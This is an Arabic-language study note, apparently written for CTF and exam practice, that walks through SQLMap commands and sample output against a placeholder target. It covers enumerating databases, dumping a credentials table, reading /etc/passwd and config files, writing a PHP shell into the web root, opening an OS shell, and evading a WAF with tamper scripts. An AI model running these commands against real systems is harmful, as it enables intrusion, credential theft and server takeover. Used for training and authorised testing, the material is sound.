# Layer 1

## SQLMap ببساطة

بدل ما تعمل:

1. اكتشاف الثغرة يدويًا
    
2. معرفة عدد الأعمدة
    
3. معرفة الأعمدة الظاهرة
    
4. Enumeration للداتابيز
    
5. استخراج البيانات
    

كل ده يدويًا...

SQLMap بيعمله لوحده.

---

# أبسط استخدام

لو عندك URL:

```text
http://target.com/page.php?id=1
```

شغّل:

```bash
sqlmap -u "http://target.com/page.php?id=1"
```

هيبدأ:

```text
Testing connection
Testing WAF
Testing parameter
Fingerprinting DBMS
Checking SQLi
```

وفي الآخر يقولك إذا كانت Vulnerable أو لا.

---

# أهم Flow في الامتحانات والـ CTF

## 1. اكتشاف الثغرة

```bash
sqlmap -u "http://target/page.php?id=1"
```

---

## 2. معرفة قواعد البيانات

```bash
sqlmap -u "http://target/page.php?id=1" --dbs
```

مثال Output:

```text
available databases:
[*] information_schema
[*] mysql
[*] dev
[*] ilfreight
```

---

## 3. معرفة الجداول

لو لقيت Database اسمها:

```text
dev
```

اعرف الجداول:

```bash
sqlmap -u "http://target/page.php?id=1" -D dev --tables
```

Output:

```text
credentials
users
posts
```

---

## 4. معرفة الأعمدة

مثلاً جدول:

```text
credentials
```

اعرف الأعمدة:

```bash
sqlmap -u "http://target/page.php?id=1" \
-D dev \
-T credentials \
--columns
```

Output:

```text
username
password
```

---

## 5. Dump البيانات

```bash
sqlmap -u "http://target/page.php?id=1" \
-D dev \
-T credentials \
--dump
```

Output:

```text
+---------+----------------------------------+
| username| password                         |
+---------+----------------------------------+
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99|
+---------+----------------------------------+
```

---

# معرفة نوع قاعدة البيانات

```bash
sqlmap -u "http://target/page.php?id=1" --banner
```

مثال:

```text
MariaDB 10.3.22
```

أو:

```text
MySQL 8.0
```

أو:

```text
PostgreSQL 15
```

---

# معرفة المستخدم الحالي

```bash
sqlmap -u "http://target/page.php?id=1" --current-user
```

Output:

```text
root@localhost
```

---

# معرفة قاعدة البيانات الحالية

```bash
sqlmap -u "http://target/page.php?id=1" --current-db
```

---

# معرفة صلاحيات المستخدم

```bash
sqlmap -u "http://target/page.php?id=1" --privileges
```

---

# معرفة إذا كان DBA

```bash
sqlmap -u "http://target/page.php?id=1" --is-dba
```

Output:

```text
current user is DBA: True
```

---

# قراءة ملفات من السيرفر

لو عندك FILE Privilege:

```bash
sqlmap -u "http://target/page.php?id=1" \
--file-read="/etc/passwd"
```

أو:

```bash
sqlmap -u "http://target/page.php?id=1" \
--file-read="/var/www/html/config.php"
```

---

# كتابة ملفات

لو البيئة تسمح:

```bash
sqlmap -u "http://target/page.php?id=1" \
--file-write=shell.php \
--file-dest=/var/www/html/shell.php
```

---

# تشغيل أوامر نظام التشغيل

لو SQLMap قدر يوصل لـ RCE:

```bash
sqlmap -u "http://target/page.php?id=1" --os-shell
```

هيفتحلك شبه Shell:

```text
os-shell>
```

وتنفذ أوامر.

---

# لو الموقع بيستخدم POST

بدل GET:

```bash
sqlmap -u "http://target/login.php" \
--data="username=admin&password=test"
```

---

# لو معاك Request من Burp

وده الأكثر استخدامًا عمليًا.

احفظ الريكوست:

```text
request.txt
```

ثم:

```bash
sqlmap -r request.txt
```

SQLMap هيقرأ:

- Headers
    
- Cookies
    
- POST Data
    
- Tokens
    

كله تلقائيًا.

---

# لو الموقع خلف WAF

SQLMap فيه Tamper Scripts.

اعرض المتاح:

```bash
sqlmap --list-tampers
```

أشهرهم:

```bash
--tamper=space2comment
```

```bash
--tamper=randomcase
```

```bash
--tamper=between
```

مثال:

```bash
sqlmap -r request.txt \
--tamper=space2comment
```

---

# أنواع SQLi التي يدعمها SQLMap

|النوع|السرعة|
|---|---|
|UNION|الأسرع|
|Error Based|سريع|
|Boolean Blind|متوسط|
|Time Blind|بطيء|
|Stacked Queries|حسب البيئة|
|Inline Queries|نادر|
|Out Of Band (DNS)|متقدم جدًا|

---

# أكثر أوامر SQLMap استخدامًا

```bash
sqlmap -u URL --dbs
```

قواعد البيانات

---

```bash
sqlmap -u URL -D db --tables
```

الجداول

---

```bash
sqlmap -u URL -D db -T table --columns
```

الأعمدة

---

```bash
sqlmap -u URL -D db -T table --dump
```

استخراج البيانات

---

```bash
sqlmap -u URL --current-user
```

المستخدم الحالي

---

```bash
sqlmap -u URL --current-db
```

قاعدة البيانات الحالية

---

```bash
sqlmap -u URL --is-dba
```

صلاحيات DBA

---

```bash
sqlmap -u URL --os-shell
```

محاولة الحصول على Shell

---

